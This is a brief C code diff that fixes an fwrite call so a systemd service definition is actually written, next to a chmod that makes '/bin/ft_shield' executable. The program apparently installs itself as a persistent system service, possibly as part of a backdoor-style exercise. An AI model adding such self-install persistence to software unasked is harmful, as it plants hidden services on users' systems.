@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <string.h>
-#include <stdlib.h>
 #include <sys/stat.h>
 #include "./shield.c"
 
@@ -38,7 +37,7 @@ int main() {
         perror("Erreur lors de l'ouverture du fichier");
         return 1;
     }
-    fwrite(systemd, strlen(systemd), 0, fp);
+    fwrite(systemd, strlen(systemd), 1, fp);
     fclose(fp);
     int ret = chmod("/bin/ft_shield", S_IXUSR | S_IXGRP | S_IXOTH);
     if (ret == -1)
